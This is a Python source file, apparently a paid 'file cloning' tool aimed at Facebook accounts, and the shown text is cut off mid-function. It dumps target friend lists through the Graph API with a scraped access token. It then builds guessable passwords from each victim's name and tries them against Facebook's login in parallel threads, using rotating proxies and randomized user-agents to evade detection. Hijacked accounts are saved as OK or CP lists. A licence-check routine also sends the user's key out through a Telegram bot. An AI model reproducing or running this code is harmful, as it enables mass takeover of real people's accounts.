    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/tonmoy404-cyber/FILE_X/blob/main/tonmoy_ua.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ ASHIK- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/groups/266865079324430/?ref=share_group_link')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/ashik.khan444?mibextid=b06tZ0')
logo =(f"""
     \x1b[38;5;195m╔═════════════════════════════════╗
     \x1b[38;5;195m║      \33[1;33m db           \33[1;36m.d8888.\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88           \33[1;36m88'  YP\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88           \33[1;36m`8bo.\x1b[38;5;195m        ║\x1b[38;5;196m   
     \x1b[38;5;195m║      \33[1;33m 88             \33[1;36m`Y8b.\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88booo.      \33[1;36mdb   8D\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m Y88888P      \33[1;36m`8888Y'\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m╚═════════════════════════════════╝ 
     \x1b[38;5;195m╔═════════════════════════════════╗
                 ONLY PAID USER                             
     \x1b[38;5;195m╚═════════════════════════════════╝                                                      
\33[1;31m88""Yb\33[1;32m 88""Yb\33[1;33m  dP"Yb\33[1;34m  888888\33[1;35m 88  88\33[1;36m 888888\33[1;34m 88""Yb 
\33[1;31m88__dP\33[1;32m 88__dP\33[1;33m dP   Yb\33[1;34m   88\33[1;35m   88  88\33[1;36m 88__   \33[1;34m88__dP 
\33[1;31m88""Yb\33[1;32m 88"Yb\33[1;33m  Yb   dP\33[1;34m   88\33[1;35m   888888\33[1;36m 88""   \33[1;34m88"Yb  
\33[1;31m88oodP\33[1;32m 88  Yb\33[1;33m  YbodP\33[1;34m    88\33[1;35m   88  88\33[1;36m 888888 \33[1;34m88  Yb
\33[1;32m───────────────────────────────────────────────────
[] AUTHOR       :     PRINCE SOHAN
[] TOOLS        :     FILE-CLONING
[] TYPE         :     PREMIUM
[] FACEBOOK     :     L-S BROTHER
[] VERSION      :     9.9
[] MESSENGER    :     LS BROTHER (TIM)
\33[1;32m──────────────────────────────────────────────────""")
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 15 DEYS 200TK 30 DEYS 400TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[] YOUR TOKEN IS SUCCESSFULLY APPROVED""")
xudinaministar =(""" \033[32;1m[-] Importent Note """)
hedaborakarent =(""" \033[32;1m[] FUCK BYPASAR CHAKE YOUR DATA """)
#____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/SSC-LOL/PAID-9.2V/blob/main/approval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(" \033[32;1m[+] Your Kay : "+id)
      print('\033[92;1m┏━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mFREE USER NOT CAME INBOX')
      print('\033[92;1m┣━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1mFREE-FIRE-TIK-TOK-PUBG- ID CLONING')
      print('\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mONLY ACTIVE ID CLONE')
      print('\033[92;1m┏━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1mUNACTIVE ID NOT ALLOW')
      print('\033[92;1m┣━\033[97;1m[\033[92;1m+\033[97;1m] \x1b[38;5;50mWI-FI WORKING 90%')
      print('\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1m15 DAY 200TAKA ')
      print('\033[92;1m┏━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1m30 DAY 400TAKA ')
      print('\033[92;1m┣━\033[97;1m[\033[92;1m+\033[97;1m] \x1b[38;5;50mPAID ')
      print("\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1mYOUR KEY : "+id)
      print(f'\033[92;1m┏━──────────────────────────────────────────────────\033[1;37m')
      input('\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mIF U WANT TO BUY THEN PRESS ENTER ')
      os.system("python ASHIK-6-4V.py")
      tks = ('7622589956:AAE-SV_2-ncYA9qCgeWoOROGvdnWz1FiTQo/sendMessage?chat_id=6254652615&text= [•] '+id);os.system('am start https://wa.me/+9647856022854?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
os.system("python ASHIK.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m+\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  BROTHER ,  V I P,  Tools"')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m+\033[1;91m]\x1b[38;5;50m USERNAME KEY: ')
    password = input('\033[1;91m[\033[1;92m+\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'BRO' :
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97mYOUR TOOLS ACTIVE \x1b[38;5;50m[PREMIUM] ")
    print(f"\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m \x1b[38;5;50mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m \033[0;93mTODAY DATE :\x1b[38;5;50m "+date)
    print(f'\033[1;91m┏━───────────────────────────\033[1;37m')
    print(f"""\033[1;92m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \033[1;96mFILE CLONE""")
    print("""\033[1;92m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mFOLLOW MY FACEBOOK""")
    print(f"""\033[1;92m┣━\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[1;95mCHECK OK ID AND CP ID""")
    print("""\033[1;92m┣━\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m \x1b[38;5;50mEXIT""")
    print(f'\033[1;91m┗━───────────────────────────\033[1;37m')
    ASHIK = input('\x1b\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    if ASHIK in ['111']:
        login()
        dump_massal()
    elif ASHIK in ['1']:
        crack_file()
    elif ASHIK in ['2','02']:
        os.system('xdg-open https://github.com/SSC-LOL')
        os.system("python nono.py")
    elif ASHIK in ['3','03']:
        result()
    elif ASHIK in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
    #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print('\x1b[38;5;50m┏━[𝟷]  \x1b[38;5;50mCHECK CP IDZ ')
    print('\x1b[38;5;50m┣━[𝟸]  \x1b[38;5;50m OK IDZ ')
    print('\x1b[38;5;50m┗━[𝟹]  \x1b[38;5;50m ')
    print('\x1b[38;5;50m═══════════════')
    kz = input(' \033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\x1b[38;5;50m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CP : \033[33m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\x1b[38;5;50m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f'\033[97;1m[\x1b[38;5;50m•\033[97;1m] OK : \033[32m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\x1b[38;5;50m==================')
        animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\x1b[38;5;50m==================')
        jum = int(input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] ENTER TARGET AMOUNT  : '))
        print('\x1b[38;5;50m==================')
    except ValueError:
        print('\x1b[38;5;50m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\x1b[38;5;50m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\x1b[38;5;50m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\x1b[38;5;50m==================')
        print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\x1b[38;5;50m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print(f'\033[38;5;196m───────────────────\033[1;37m')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mFILE NAME EXAMPLE: /sdcard/file.txt Etc.]')
    o = input('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mYOUR FILE NAME :\x1b[1;95m ')
    print(f'\033[38;5;196m───────────────────\033[1;37m')
    try:lin = open(o).read().splitlines()
    except:
        print(f'\033[38;5;196m───────────────────\033[1;37m')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print(f'\033[38;5;196m┏━───────────────────\033[1;37m')
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50mOLD ID")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mNEW ID")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[38;5;50mMIX ID [BEST]")
    print(f'\033[38;5;196m┗━───────────────────\033[1;37m')
    hu = input('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \033[1;96mCHOOSE :\x1b[38;5;50m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print(f'\033[38;5;196m┏━───────────────────\033[1;37m')
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50m COOKIES  [\x1b[1;95mBEST\x1b[38;5;50m]")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \x1b[38;5;50m CP ID [\x1b[38;5;50mBEST\x1b[38;5;50m]")
    print(f'\033[38;5;196m┗━───────────────\033[1;37m')
    hc = input('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    #os.system("xdg-open https://www.facebom/ASHIK.King.Ok.Bro")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;50m┏━──────────────────────────────────────────────────\033[1;37m')
    print(f"\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97mYOUR TOOLS ACTIVE \x1b[38;5;50m[PREMIUM] ") 
    print(f"\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97mUSER NAME\033[1;91m :\033[1;96m "+UNAME)
    print('\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[41m\x1b[1;97mYOUR TOTAL IDZ \033[0;97m:\x1b[38;5;50m ',str(len(id)))
   # print("\033[1;91m[\033[1;92m+\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print(f'\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \x1b[38;5;46m\033[1;97m𝙵𝙰𝚂𝚃 \033[1;34m[\033[1;32m𝙽𝙾\033[1;97m/\033[38;5;196m𝙾𝙵𝙵\033[1;34m] \033[1;97m𝙰𝙸𝚁𝙿𝙻𝙰𝙽𝙴 𝙼𝙾𝙳𝙴] [💙] ')
    print(f'\x1b[38;5;50m┗━──────────────────────────────────────────────────\033[1;37m')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')                                        
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')                   
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')               
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(OK))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(CP))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python ASHIK-6-3.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,CP
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[BROTHER-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
